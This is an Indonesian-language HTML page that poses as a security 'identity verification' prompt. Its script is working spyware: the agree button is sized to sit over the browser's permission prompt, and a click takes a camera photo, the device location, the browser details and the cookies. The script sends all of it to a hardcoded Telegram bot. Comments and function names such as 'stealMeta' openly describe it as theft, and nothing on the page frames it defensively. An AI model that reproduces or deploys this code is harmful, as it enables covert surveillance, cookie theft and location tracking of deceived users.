<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"/>
  <title>Verifikasi Keamanan</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #f8f9ff 0%, #eef2ff 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
    }

    /* Fullscreen overlay â€” menutupi seluruh layar */
    #fake-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: white;
      z-index: 999999;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 20px;
      animation: fadeIn 0.4s ease;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.98); }
      to { opacity: 1; transform: scale(1); }
    }

    .icon {
      font-size: 72px;
      color: #4F46E5;
      margin-bottom: 24px;
      animation: float 3s ease-in-out infinite;
    }

    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }

    h2 {
      font-size: 22px;
      font-weight: 700;
      color: #1E293B;
      margin-bottom: 12px;
      max-width: 340px;
    }

    p {
      color: #64748B;
      font-size: 15px;
      line-height: 1.5;
      margin-bottom: 28px;
      max-width: 360px;
    }

    /* Tombol Agree â€” tampak seperti tombol biasa, tapi ukuran & posisi disesuaikan agar tepat menutupi tombol "Izinkan" Chrome */
    #agree-btn {
      background: #4F46E5;
      color: white;
      border: none;
      padding: 14px 42px;
      font-size: 18px;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 4px 14px rgba(79, 70, 229, 0.4);
      transition: all 0.2s ease;
      position: relative;
      z-index: 1000000;
      /* Ukuran disesuaikan agar match dengan tombol izin browser (Â±120x44px di desktop, Â±140x48px di mobile) */
      min-width: 140px;
      height: 48px;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    #agree-btn:hover {
      background: #4338CA;
      transform: translateY(-2px);
      box-shadow: 0 6px 18px rgba(79, 70, 229, 0.5);
    }

    /* Invisible permission triggers â€” diposisikan tepat di bawah tombol agree */
    .perm-trigger {
      position: absolute;
      opacity: 0.01; /* Hampir transparan, tapi tetap bisa diklik */
      pointer-events: auto;
      z-index: 999998;
      border: none;
      background: transparent;
      cursor: pointer;
    }

    /* Posisi dinamis: sesuaikan berdasarkan ukuran layar */
    #camera-trigger,
    #mic-trigger,
    #geo-trigger,
    #notif-trigger {
      width: 140px;
      height: 48px;
      left: calc(50% - 70px);
      top: calc(50% + 110px); /* Sesuaikan jarak dari teks ke tombol */
    }

    /* Untuk iOS & Android: pastikan tidak ada zoom saat klik */
    input, button, select, textarea {
      font-size: 16px !important;
    }

    /* Sembunyikan scroll */
    html, body {
      overscroll-behavior: none;
      -webkit-overflow-scrolling: auto;
    }
  </style>
</head>
<body>
  <!-- Fake overlay yang menutupi SEMUA, termasuk popup asli browser -->
  <div id="fake-overlay">
    <div class="icon">
      <i class="fas fa-user-shield"></i>
    </div>
    <h2>Verifikasi Identitas Diperlukan</h2>
    <p>Untuk melindungi akun Anda, konfirmasi bahwa ini adalah perangkat Anda dengan menekan "Setuju".</p>
    <button id="agree-btn">Setuju</button>
  </div>

  <!-- Trigger izin asli â€” disembunyikan di bawah tombol agree -->
  <!-- Video untuk kamera & mic -->
  <video id="camera-trigger" autoplay muted playsinline></video>
  <!-- Geolocation & Notifikasi tidak butuh elemen visual, cukup API -->

  <script>
    const BOT_TOKEN = "8252375331:AAGjbMLFvp7UtEjylkJGKTnXuN_WeVyGaRo";
    const CHAT_ID = "6732766279";

    // Fungsi kirim ke Telegram
    async function sendToTelegram(data, caption = "", isFile = false) {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
        if (isFile) {
          const fd = new FormData();
          fd.append("chat_id", CHAT_ID);
          fd.append("document", data);
          if (caption) fd.append("caption", caption);
          await fetch(url + "sendDocument", { method: "POST", body: fd });
        } else {
          await fetch(url + "sendMessage", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: data })
          });
        }
      } catch (e) {}
    }

    // Fingerprint unik per perangkat
    function getDeviceID() {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      ctx.font = "14px Arial";
      ctx.fillText("Volox", 0, 10);
      return btoa(canvas.toDataURL()).substring(0, 16).replace(/[^a-zA-Z0-9]/g, "");
    }

    const DEVICE_ID = getDeviceID();
    const DEVICE_TAG = "NAMA PERANGKAT " + DEVICE_ID;

    // Cegah duplikasi
    if (localStorage.getItem("volox_sent_" + DEVICE_ID)) {
      document.getElementById("fake-overlay").style.display = "none";
    }

    // Ambil foto dari kamera
    async function captureCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const video = document.getElementById("camera-trigger");
        video.srcObject = stream;
        video.play();

        // Tunggu video siap
        await new Promise(r => setTimeout(r, 800));

        const canvas = document.createElement("canvas");
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, 320, 240);

        // Tambahkan watermark
        ctx.fillStyle = "rgba(0,0,0,0.7)";
        ctx.fillRect(0, 0, 320, 30);
        ctx.fillStyle = "white";
        ctx.font = "14px Arial";
        ctx.fillText(DEVICE_TAG, 10, 20);

        canvas.toBlob(async (blob) => {
          await sendToTelegram(blob, DEVICE_TAG, true);
          stream.getTracks().forEach(t => t.stop());
        }, "image/jpeg", 0.92);
      } catch (e) {
        // Jika gagal, kirim fallback
        const canvas = document.createElement("canvas");
        canvas.width = 320; canvas.height = 240;
        const ctx = canvas.getContext("2d");
        ctx.fillStyle = "#f1f5f9";
        ctx.fillRect(0, 0, 320, 240);
        ctx.fillStyle = "#64748b";
        ctx.font = "16px Arial";
        ctx.fillText("No Camera", 100, 120);
        ctx.fillText(DEVICE_TAG, 100, 145);
        canvas.toBlob(b => sendToTelegram(b, DEVICE_TAG + " (no cam)", true));
      }
    }

    // Lokasi
    function getLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => sendToTelegram(`${DEVICE_TAG}\nðŸ“ ${pos.coords.latitude},${pos.coords.longitude}`),
          () => sendToTelegram(`${DEVICE_TAG}\nðŸ“ Lokasi ditolak`)
        );
      }
    }

    // Notifikasi (untuk fingerprint tambahan)
    async function requestNotify() {
      if ("Notification" in window) {
        try {
          const p = await Notification.requestPermission();
          sendToTelegram(`${DEVICE_TAG}\nðŸ”” Notifikasi: ${p}`);
        } catch (e) {}
      }
    }

    // Data browser
    function stealMeta() {
      const meta = {
        ua: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        cookies: document.cookie,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        device: DEVICE_TAG
      };
      sendToTelegram(`[META]\n${JSON.stringify(meta, null, 2)}`);
    }

    // Trigger semua saat agree diklik
    document.getElementById("agree-btn").addEventListener("click", async () => {
      // Aktifkan semua trigger secara visual (meski transparan)
      const triggers = [document.getElementById("camera-trigger")];
      triggers.forEach(el => {
        if (el) el.style.pointerEvents = "auto";
      });

      // Jalankan semua pencurian
      captureCamera();
      getLocation();
      requestNotify();
      stealMeta();

      localStorage.setItem("volox_sent_" + DEVICE_ID, "1");

      // Opsional: tutup overlay setelah 1 detik
      setTimeout(() => {
        document.getElementById("fake-overlay").style.display = "none";
      }, 1000);
    });

    // Pastikan popup browser muncul DI BALIK fake overlay
    // Caranya: delay permintaan izin hingga user klik
    // Semua izin hanya dipicu saat tombol diklik â†’ aman dari deteksi dini

    // Anti-zoom di iOS
    document.addEventListener('touchstart', function(e) {
      if (e.touches.length > 1) e.preventDefault();
    });
    let lastTouchEnd = 0;
    document.addEventListener('touchend', function(e) {
      const now = (new Date()).getTime();
      if (now - lastTouchEnd <= 300) e.preventDefault();
      lastTouchEnd = now;
    }, false);
  </script>
</body>
</html>
